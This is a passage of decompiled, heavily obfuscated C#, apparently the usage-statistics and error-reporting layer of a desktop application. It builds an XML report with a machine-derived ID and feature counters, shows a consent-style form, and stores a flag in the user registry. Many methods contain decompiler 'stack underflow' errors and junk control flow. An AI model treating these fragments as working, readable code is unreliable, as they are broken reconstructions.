				dictionary = global::_0005._0011._0001(obj);
				memoryStream = new MemoryStream();
				xmlWriter = new XmlTextWriter(memoryStream, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
				global::_000F._007E_009A(xmlWriter);
				obj2 = new global::_0004._000F(xmlWriter, _000E._0003._0001(107388159));
				try
				{
					_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107395300), global::_0007._008B(_000E._0003._0001(107395315)));
					_008E obj3 = _008E._007E_0086_0003;
					XmlWriter xmlWriter2 = xmlWriter;
					string text = _000E._0003._0001(107395262);
					dateTime = _0098._0097_0003();
					obj3(xmlWriter2, text, dateTime.ToString(_000E._0003._0001(107395249)));
					_008E obj4 = _008E._007E_0086_0003;
					XmlWriter xmlWriter3 = xmlWriter;
					string text2 = _000E._0003._0001(107395226);
					guid = _009A._0099_0003();
					obj4(xmlWriter3, text2, guid.ToString(_000E._0003._0001(107395912)));
					text3 = global::_0005._0011._0001();
					mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
					try
					{
						guid = new Guid(_0018_0003._007E_0008_0006(mD5CryptoServiceProvider, _0087_0002._007E_0004_0005(_0013._008D_0002(), text3)));
						text4 = guid.ToString();
					}
					finally
					{
						if (mD5CryptoServiceProvider != null)
						{
							global::_000F._007E_0099(mD5CryptoServiceProvider);
						}
					}
					_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107395203), text4);
					obj5 = new global::_0004._000F(xmlWriter, _000E._0003._0001(107394668));
					try
					{
						_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107394709), _000E._0003._0001(107388110));
					}
					finally
					{
						if (obj5 != null)
						{
							global::_000F._007E_0099(obj5);
						}
					}
					obj5 = new global::_0004._000F(xmlWriter, _000E._0003._0001(107388105));
					try
					{
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < array.Length)
						{
							if (array[*(int*)((byte*)ptr + 8)] != 0 && 0 == 0)
							{
								_0011._007E_008B_0002(xmlWriter, _000E._0003._0001(107388124));
								_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107388079), ((int*)((byte*)ptr + 8))->ToString());
								_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107394709), array[*(int*)((byte*)ptr + 8)].ToString());
								global::_000F._007E_0012_0002(xmlWriter);
							}
							(*(int*)((byte*)ptr + 8))++;
						}
					}
					finally
					{
						if (obj5 != null)
						{
							global::_000F._007E_0099(obj5);
						}
					}
					obj5 = new global::_0004._000F(xmlWriter, _000E._0003._0001(107388074));
					try
					{
						enumerator = dictionary.GetEnumerator();
						try
						{
							while (enumerator.MoveNext())
							{
								current = enumerator.Current;
								if (current.Value != 0)
								{
									_0011._007E_008B_0002(xmlWriter, _000E._0003._0001(107388124));
									_008E._007E_0086_0003(xmlWriter, _000E._0003._0001(107395982), current.Key);
									_008E obj6 = _008E._007E_0086_0003;
									XmlWriter xmlWriter4 = xmlWriter;
									string text5 = _000E._0003._0001(107394709);
									*(ulong*)ptr = current.Value;
									obj6(xmlWriter4, text5, ((ulong*)ptr)->ToString());
									global::_000F._007E_0012_0002(xmlWriter);
								}
							}
						}
						finally
						{
							((IDisposable)enumerator).Dispose();
						}
					}
					finally
					{
						if (obj5 != null)
						{
							global::_000F._007E_0099(obj5);
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_000F._007E_0099(obj2);
					}
				}
				global::_000F._007E_009B(xmlWriter);
				global::_000F._007E_009C(xmlWriter);
				global::_000F._007E_009D(memoryStream);
				this._0001 = _0007_0002._007E_0010_0004(memoryStream);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, new object[17]
				{
					obj,
					array,
					dictionary,
					memoryStream,
					xmlWriter,
					obj2,
					text3,
					text4,
					dateTime,
					guid,
					mD5CryptoServiceProvider,
					obj5,
					*(int*)((byte*)ptr + 8),
					enumerator,
					current,
					*(ulong*)ptr,
					this
				});
				throw;
			}
		}
	}
}
namespace _0008
{
	internal class _0006
	{
		internal sealed class _0001
		{
			private readonly _0006 m__0001;

			private readonly byte[] m__0001;

			private readonly global::_0006._0008 m__0001;

			private readonly _0003 m__0001;

			public bool _0001 = true;

			public _0001(_0006 P_0, byte[] P_1, global::_0006._0008 P_2, _0003 P_3)
			{
				try
				{
					this.m__0001 = P_0;
					this.m__0001 = P_3;
					this.m__0001 = P_2;
					this.m__0001 = P_1;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0, (object)P_1, (object)P_2, (object)P_3);
					throw;
				}
			}

			public void _0001(string P_0)
			{
				//IL_012a: Incompatible stack heights: 0 vs 2
				//IL_0134: Incompatible stack heights: 0 vs 1
				//IL_013e: Incompatible stack heights: 0 vs 1
				//IL_0144: Incompatible stack heights: 0 vs 1
				//IL_0158: Incompatible stack heights: 0 vs 2
				//IL_0162: Incompatible stack heights: 0 vs 1
				//IL_016c: Incompatible stack heights: 0 vs 1
				byte[] array = default(byte[]);
				byte[] array2 = default(byte[]);
				_0002 obj = default(_0002);
				string text4 = default(string);
				try
				{
					_ = global::_0008._0095;
					_000E._0003._0001(107393816);
					/*Error near IL_013e: Stack underflow*/((string)/*Error near IL_013e: Stack underflow*/, (string)/*Error near IL_013e: Stack underflow*/);
					if ((int)/*Error near IL_001e: Stack underflow*/ != 0)
					{
						global::_0005._0011._0001(((_0001)/*Error near IL_0028: Stack underflow*/).m__0001, _0007._0005._0003);
						_ = _0087_0002._007E_0004_0005;
						_0013._008F_0002();
						_000E._0003._0001(107395315);
						/*Error near IL_016c: Stack underflow*/((object)/*Error near IL_016c: Stack underflow*/, (string)/*Error near IL_016c: Stack underflow*/);
						array = (byte[])/*Error near IL_0172: Stack underflow*/;
						array2 = new byte[array.Length + this.m__0001.Length];
						_001D_0004._001A_0007(array, array2, array.Length);
						_0093_0002._001F_0005(this.m__0001, 0, array2, array.Length, this.m__0001.Length);
						obj = new _0002(this.m__0001);
						global::_0006._0008 obj2 = this.m__0001;
						string text = global::_0005._0011._0001(this.m__0001);
						string text2 = global::_0005._0011._0001(this.m__0001);
						string text3 = global::_0005._0011._0001(this.m__0001);
						global::_0001._0006 obj3 = obj._0001;
						global::_0005._0011._0001(obj3, text2, text3, obj2, text, array2);
						this._0001 = obj._0001;
					}
					else
					{
						text4 = P_0;
						if (this.m__0001._0001 != null)
						{
							this.m__0001._0001(this, new global::_0005._000F(_0007._0005._0002, text4));
						}
						this._0001 = false;
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)array, (object)array2, (object)obj, (object)text4, (object)this, (object)P_0);
					throw;
				}
			}
		}

		private sealed class _0002
		{
			private readonly _0006 m__0001;

			public bool _0001;

			public _0002(_0006 P_0)
			{
				try
				{
					this.m__0001 = P_0;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0);
					throw;
				}
			}

			public void _0001(string P_0)
			{
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_0055: Incompatible stack heights: 0 vs 2
				//IL_005f: Incompatible stack heights: 0 vs 1
				//IL_0069: Incompatible stack heights: 0 vs 1
				//IL_006f: Incompatible stack heights: 0 vs 1
				//IL_0072: Incompatible stack heights: 0 vs 1
				//IL_007c: Incompatible stack heights: 0 vs 1
				//IL_007f: Incompatible stack heights: 0 vs 1
				//IL_0082: Incompatible stack heights: 0 vs 4
				try
				{
					_ = _000E_0002._007E_0014_0004;
					_000E._0003._0001(107393821);
					/*Error near IL_0069: Stack underflow*/((object)/*Error near IL_0069: Stack underflow*/, (string)/*Error near IL_0069: Stack underflow*/);
					while (true)
					{
						if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
						{
							goto IL_0012;
						}
						goto IL_0036;
						IL_0036:
						_ = ((_0002)/*Error near IL_003b: Stack underflow*/).m__0001;
						_ = 4;
						_ = string.Empty;
						global::_0005._0011._0001((_0006)/*Error near IL_0048: Stack underflow*/, (_0007._0005)/*Error near IL_0048: Stack underflow*/, (string)/*Error near IL_0048: Stack underflow*/, (string)/*Error near IL_0048: Stack underflow*/);
						goto IL_0048;
						IL_0048:
						this._0001 = true;
						if (0 == 0)
						{
							break;
						}
						goto IL_0012;
						IL_0012:
						if (3 == 0)
						{
							continue;
						}
						_0006 obj = ((_0002)/*Error near IL_001f: Stack underflow*/).m__0001;
						global::_0005._0011._0001((_0007._0005)/*Error near IL_0079: Stack underflow*/, (string)/*Error near IL_0079: Stack underflow*/, obj);
						if (8u != 0)
						{
							((_0002)/*Error near IL_002c: Stack underflow*/)._0001 = false;
							if (false)
							{
								goto IL_0048;
							}
							if (0 == 0)
							{
								break;
							}
						}
						goto IL_0036;
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0);
					throw;
				}
			}
		}

		internal sealed class _0003
		{
			public static _0003 _0001;

			internal readonly string _0001;

			internal readonly string _0002;

			internal readonly string _0003;

			public _0003(string P_0, string P_1, string P_2)
			{
				try
				{
					_0001 = P_0;
					_0003 = P_2;
					_0002 = P_1;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0, (object)P_1, (object)P_2);
					throw;
				}
			}

			static _0003()
			{
				//IL_0011: Incompatible stack heights: 0 vs 1
				try
				{
					new _0003(null, null, null);
					_0006._0003._0001 = (_0003)/*Error near IL_000a: Stack underflow*/;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex);
					throw;
				}
			}
		}

		internal IWebProxy _0001;

		[CompilerGenerated]
		internal global::_0002._000F _0001;

		[SpecialName]
		[CompilerGenerated]
		public void _0001(global::_0002._000F P_0)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			global::_0002._000F obj = default(global::_0002._000F);
			global::_0002._000F obj2 = default(global::_0002._000F);
			global::_0002._000F obj3 = default(global::_0002._000F);
			try
			{
				obj = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				do
				{
					obj2 = (global::_0002._000F)/*Error near IL_003e: Stack underflow*/;
					_ = _0016_0002._001E_0004;
					/*Error near IL_004b: Stack underflow*/((Delegate)/*Error near IL_004b: Stack underflow*/, (Delegate)/*Error near IL_004b: Stack underflow*/);
					obj3 = (global::_0002._000F)/*Error near IL_0019: Stack underflow*/;
					obj = Interlocked.CompareExchange(ref ((_0006)/*Error near IL_0026: Stack underflow*/)._0001, obj3, obj2);
				}
				while ((object)obj != obj2);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)obj, (object)obj2, (object)obj3, (object)this, (object)P_0);
				throw;
			}
		}
	}
}
namespace _0003
{
	internal sealed class _000E
	{
		public static string _0001;
	}
}
namespace _0002
{
	internal delegate void _000F(object, global::_0005._000F);
}
namespace _0005
{
	internal sealed class _000F : EventArgs
	{
		private global::_0007._0005 _0001;

		private readonly bool _0001;

		private readonly string _0001 = string.Empty;

		private readonly string _0002 = string.Empty;

		internal _000F(global::_0007._0005 P_0, string P_1)
			: this(P_0, P_1, string.Empty)
		{
		}

		internal _000F(global::_0007._0005 P_0, string P_1, string P_2)
		{
			try
			{
				this._0001 = P_0;
				this._0001 = P_1 != null && P_1.Length > 0;
				_0001 = P_1;
				_0002 = P_2;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)this, (object)P_0, (object)P_1, (object)P_2);
				throw;
			}
		}
	}
}
namespace _0007
{
	internal enum _0005
	{
		_0001 = 1,
		_0002,
		_0003,
		_0004
	}
}
namespace _0001
{
	internal delegate void _0006(string);
}
namespace _0004
{
	internal sealed class _000F : IDisposable
	{
		private readonly XmlWriter m__0001;

		public _000F(XmlWriter P_0, string P_1)
		{
			try
			{
				this.m__0001 = P_0;
				this.m__0001.WriteStartElement(P_1);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this, (object)P_0, (object)P_1);
				throw;
			}
		}

		public void _0001()
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			try
			{
				_ = global::_000F._007E_0012_0002;
				XmlWriter xmlWriter = ((_000F)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0018: Stack underflow*/(xmlWriter);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this);
				throw;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0006
{
	internal sealed class _0008
	{
		internal static readonly string _0001;

		internal string _0002;

		internal string _0003;

		internal IWebProxy _0001;

		public _0008(string P_0)
		{
			try
			{
				_0002 = P_0;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this, (object)P_0);
				throw;
			}
		}

		static _0008()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			try
			{
				_000E._0003._0001(107394432);
				_0008._0001 = (string)/*Error near IL_000c: Stack underflow*/;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
namespace _0005
{
	[CompilerGenerated]
	internal sealed class _0010
	{
	}
}
namespace _000E
{
	internal sealed class _0007
	{
	}
}
namespace _0004
{
	internal sealed class _0010 : Form
	{
		internal Label _0001;

		internal Button _0001;

		internal Button _0002;

		private IContainer m__0001 = null;

		protected override void _0001(bool P_0)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 2
			//IL_005d: Incompatible stack heights: 0 vs 2
			//IL_0060: Incompatible stack heights: 0 vs 1
			bool flag = default(bool);
			try
			{
				while (true)
				{
					if (2u != 0)
					{
						flag = (int)/*Error near IL_0008: Stack underflow*/ != 0 && ((_0010)/*Error near IL_000f: Stack underflow*/).m__0001 != null;
						if (false)
						{
							goto IL_002e;
						}
						if ((int)/*Error near IL_001e: Stack underflow*/ == 0)
						{
							goto IL_0032;
						}
					}
					goto IL_001f;
					IL_0032:
					if (false)
					{
						continue;
					}
					_ = _0084_0002._0002_0005;
					/*Error near IL_0067: Stack underflow*/((object)/*Error near IL_0067: Stack underflow*/, (byte)/*Error near IL_0067: Stack underflow*/ != 0);
					if (uint.MaxValue != 0)
					{
						break;
					}
					goto IL_001f;
					IL_001f:
					_ = global::_000F._007E_0099;
					IContainer container = ((_0010)/*Error near IL_002b: Stack underflow*/).m__0001;
					/*Error near IL_005a: Stack underflow*/(container);
					goto IL_002e;
					IL_002e:
					if (6 == 0)
					{
						goto IL_001f;
					}
					goto IL_0032;
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)flag, (object)this, (object)P_0);
				throw;
			}
		}

		public _0010()
		{
			Size clientSize = default(Size);
			try
			{
				global::_0005._0011._0001(this);
				Button obj = _0002;
				clientSize = ((Form)this).get_ClientSize();
				((Control)obj).set_Top(clientSize.Height - 13 - ((Control)_0002).get_Height());
				((Control)this._0001).set_Top(((Control)_0002).get_Top() - 6 - ((Control)this._0001).get_Height());
				((ButtonBase)this._0001).set_Image((Image)(object)global::_0005._0011._0001(global::_000E._0003._0001(107393870)));
				((ButtonBase)_0002).set_Image((Image)(object)global::_0005._0011._0001(global::_000E._0003._0001(107393865)));
				((Control)this._0001).set_Text(string.Format(((Control)this._0001).get_Text(), global::_0002._0010._0001, global::_0002._0010._0002));
				((Control)this).set_Text(string.Format(((Control)this).get_Text(), global::_0002._0010._0001));
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)clientSize, (object)this);
				throw;
			}
		}
	}
}
namespace _0002
{
	internal sealed class _0010 : global::_0003._0008
	{
		internal new static readonly string _0001;

		internal static readonly string _0002;

		internal new static bool? _0001;

		protected override void _0001(global::_0006._0007 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0005._0011._0001((global::_0006._0007)/*Error near IL_0010: Stack underflow*/);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this, (object)P_0);
				throw;
			}
		}

		protected unsafe override bool _0001()
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Incompatible stack heights: 0 vs 1
			do
			{
				void* ptr = stackalloc byte[2];
				try
				{
					if ((2 == 0 || 0 == 0) && 0 == 0)
					{
						global::_0005._0011._0001();
						*(_003F*)(nint)/*Error near IL_0015: Stack underflow*/ = /*Error near IL_0015: Stack underflow*/;
					}
					_ = /*Error near IL_001b: Stack underflow*/+ 1;
					sbyte num = *(sbyte*)(nint)/*Error near IL_001e: Stack underflow*/;
					*(sbyte*)(nint)/*Error near IL_001f: Stack underflow*/ = num;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)(*(bool*)ptr), (object)this);
					throw;
				}
			}
			while (2 == 0);
			return *(bool*)(nint)(/*Error near IL_0047: Stack underflow*/ + 1);
		}

		internal new unsafe static void _0001()
		{
			//IL_00eb: Incompatible stack heights: 0 vs 2
			//IL_00f5: Incompatible stack heights: 0 vs 2
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 3
			//IL_0115: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[3];
			RegistryKey registryKey = default(RegistryKey);
			string text2 = default(string);
			object obj = default(object);
			try
			{
				registryKey = null;
				try
				{
					_ = _0017_0004._0013_0007;
					global::_000E._0003._0001(107388044);
					_ = _0002;
					global::_000E._0003._0001(107388063);
					string text = _0010._0001;
					/*Error near IL_00ff: Stack underflow*/((string)/*Error near IL_00ff: Stack underflow*/, (string)/*Error near IL_00ff: Stack underflow*/, (string)/*Error near IL_00ff: Stack underflow*/, text);
					text2 = (string)/*Error near IL_0105: Stack underflow*/;
					_ = _0087_0004._007E_0083_0007;
					_ = Registry.CurrentUser;
					/*Error near IL_0115: Stack underflow*/((object)/*Error near IL_0115: Stack underflow*/, (string)/*Error near IL_0115: Stack underflow*/);
					registryKey = (RegistryKey)/*Error near IL_011b: Stack underflow*/;
					obj = _0091_0003._007E_0088_0006(registryKey, global::_000E._0003._0001(107388058));
					*(bool*)ptr = obj == null;
					if (*(bool*)ptr)
					{
						_0088_0004._007E_0084_0007(registryKey, global::_000E._0003._0001(107388058), bool.FalseString);
						((byte*)ptr)[1] = (global::_0005._0011._0001() ? ((byte)1) : ((byte)0));
						_0089_0004._007E_0086_0007(registryKey, global::_000E._0003._0001(107388058), ((bool*)((byte*)ptr + 1))->ToString(), RegistryValueKind.String);
						_0010._0001 = ((byte*)ptr)[1] != 0;
					}
					else
					{
						_0010._0001 = _008A_0004._0087_0007(obj);
					}
				}
				catch
				{
					_0010._0001 = false;
				}
				finally
				{
					((byte*)ptr)[2] = ((registryKey != null) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[2] != 0)
					{
						global::_000F._007E_001A_0002(registryKey);
					}
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)registryKey, (object)text2, obj, (object)(*(bool*)ptr), (object)(((byte*)ptr)[1] != 0), (object)(((byte*)ptr)[2] != 0));
				throw;
			}
		}

		public _0010()
		{
			try
			{
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this);
				throw;
			}
		}

		static _0010()
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			try
			{
				global::_000E._0003._0001(107395030);
				_0010._0001 = (string)/*Error near IL_000c: Stack underflow*/;
				global::_000E._0003._0001(107392560);
				_0002 = (string)/*Error near IL_0018: Stack underflow*/;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
